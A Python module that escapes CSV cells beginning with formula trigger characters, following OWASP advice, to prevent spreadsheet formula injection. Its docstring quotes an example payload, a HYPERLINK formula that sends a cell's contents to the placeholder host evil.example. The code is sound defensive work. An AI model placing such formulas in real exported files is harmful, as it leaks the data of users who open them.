"""CSV output that spreadsheets cannot execute (audit 2026-11 S-5).

Titles, source names and family labels come from feeds and providers. A cell that starts with ``=``, ``+``,
``-``, ``@`` (or a tab / carriage return, which some spreadsheets skip before reading a formula) is run as a
formula by Excel and LibreOffice: ``=HYPERLINK("https://evil.example/?"&A1,"click")``. Such text cells get a
leading apostrophe, the OWASP recommendation; numbers are written as they are.
"""
from __future__ import annotations

import csv

_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def cell(v):
    if isinstance(v, str) and v.startswith(_TRIGGERS):
        return "'" + v
    return v


class Writer:
    """``csv.writer`` with every text cell passed through :func:`cell`."""

    def __init__(self, f, **kw):
        self._w = csv.writer(f, **kw)

    def writerow(self, row):
        return self._w.writerow([cell(v) for v in row])

    def writerows(self, rows):
        for row in rows:
            self.writerow(row)


def writer(f, **kw) -> Writer:
    return Writer(f, **kw)
